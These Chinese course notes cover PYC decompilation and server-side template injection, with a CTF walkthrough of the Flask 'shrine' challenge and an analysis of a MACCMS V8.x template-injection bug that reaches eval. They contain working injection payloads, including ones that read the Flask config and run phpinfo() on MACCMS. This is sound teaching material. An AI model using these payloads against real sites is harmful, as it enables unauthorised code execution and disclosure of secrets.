![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116141246-4033f6bc-c868-4eab-817a-7339a3cd8685.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116140928-657104e2-6588-425d-8d37-98fbfd939b42.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142809-de0355a0-1221-4c97-9118-16435a897c69.png)

```plain
#知识点：
1、PYC文件反编译
2、Python-Web-SSTI
3、SSTI模版注入利用分析
```

- PY反编译-PYC编译文件反编译源码

判断是不是python开发：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116140010-e066d4f1-046e-405a-ab0f-f8616d735288.png)

```plain
pyc文件是py文件编译后生成的字节码文件(byte code)，pyc文件经过python解释器最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，一般py文件改变后，都会重新生成pyc文件。
真题附件：http://pan.baidu.com/s/1jGpB8DS
反编译平台：
https://tool.lu/pyc/ 
http://tools.bugscaner.com/decompyle/
反编译工具：https://github.com/wibiti/uncompyle2
一般在CTF上，真实上很难遇到。类似.class文件等，PHP可以直接打包，但是.net和.class，.pyc需要解密才能得到源代码。
```

- SSTI入门-原理&分类&检测&分析&利用

```plain
1、什么是SSTI？有什么漏洞危害？
漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。
2、如何判断检测SSTI漏洞的存在？
-输入的数据会被浏览器利用当前脚本语言调用解析执行
3、SSTI会产生在那些语言开发应用？
-见上图
4、SSTI安全问题在生产环境那里产生？
-存在模版引用的地方，如404错误页面展示
-存在数据接收引用的地方，如模版解析获取参数数据

报错的时候存在数据接受，把变量输入进去，解析模板的时候出现问题。

web应用是有很多模板，它是一个显示样式的东西。
切换样式后，数据一样都存在的。
样式代码：
 <div class="center-content error">
 <h1>Oops! That page doesn't exist.</h1>
 <h3>%s</h3>
 </div> 
%s是一个可控的值，留给数据库去操作，取出数据去显示，不能写死。可以写上payload，让代码进行执行。
运行程序，访问本地5000端口。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116140837-da32a44b-a16d-4fdd-92bc-aa6eab64ae4f.png)

如果访问出错地址，

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116140633-dd9594ed-bff6-4a86-bfee-a9666dc1e50a.png)

源代码接受：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116140845-a2721988-e3ff-4618-99f0-956d54ce051f.png)

构造报错：http://192.168.0.113:5000/njkncd?404_url=1

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116141307-53870d37-16b6-4aa8-9458-66ff4daf8a2b.png)

访问http://192.168.0.113:5000/njkncd?404_url={{2-2}} ：2-2被代入python执行。

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116141449-f5bbd243-4587-4c8b-9af6-7f87dfdc1ceb.png)

- SSTI考点-CTF靶场-[WesternCTF]shrine

```plain
1、源码分析SSTI考点
2、测试判断SSTI存在
3、分析代码过滤和FLAG存储
4、利用Flask两个函数利用获取
https://blog.csdn.net/houyanhua1/article/details/85470175
url_for()函数是用于构建操作指定函数的URL
get_flashed_messages()函数是获取传递过来的数据
/shrine/{{url_for.__globals__}}
/shrine/{{url_for.__globals__['current_app'].config}}
/shrine/{{get_flashed_messages.__globals__}}
/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116141363-7d32acd5-f4bb-40dc-9dbb-25b8d7e1b4d4.png)

```plain
发现关键性过滤
 s = s.replace('(', '').replace(')', '')
模板执行函数
render_template_string

判断存在：执行：http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7B2-2%7D%7D
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116141526-0410b57f-77c9-47fa-a141-399b938ed814.png)

• 获取当前脚本所有的全局变量：http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__%7D%7D

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116143464-8297094b-3107-45d1-8080-f858ab0fa37e.png)

```plain
发现当前正在使用的APP：
<class 'flask.helpers._PackageBoundObject'>, 'current_app': <Flask 'app'>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142821-257479b1-f8c3-4f2f-9df7-150ee2ee6121.png)

http://b2014503-8276-429e-8d09-b1b38af83d43.node4.buuoj.cn:81/shrine/%7B%7Burl_for.__globals__['current_app'].config['FLAG']%7D%7D  得到flag

- SSTI考点-CMS源码-MACCMS_V8.X执行

```plain
Payload:index.php?m=vod-search&wd={if-dddd:phpinfo()}{endif-dddd}
1、根据wd传递的代码找指向文件
2、index->vod->tpl->ifex->eval
3、构造Payload带入ifex并绕过后执行

m=vod-search
wd={if-dddd:phpinfo()}{endif-dddd} 

知道payload，推出漏洞成因
m传参：
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142151-6c9e7868-367a-437c-8a28-26d1288958ef.png)

定位到be函数：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142324-a3e7c79e-e408-48c7-b623-f80ce8b790a9.png)

发现包含文件：

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142982-615715c0-cb1b-4754-9036-93eedcceb259.png)

```plain
输出$ac，发现是vod文件，然后找到vod.php文件
在vod.php发现wd传参：
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116142850-a34c38b8-2a34-4b3c-8b39-ae671fd6d9cb.png)

```plain
跟踪tpl，指向ifex函数
跟踪ifex函数：
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721116143393-cb7a64b6-3799-4584-bd21-72ee253b8416.png)

发现命令执行代码段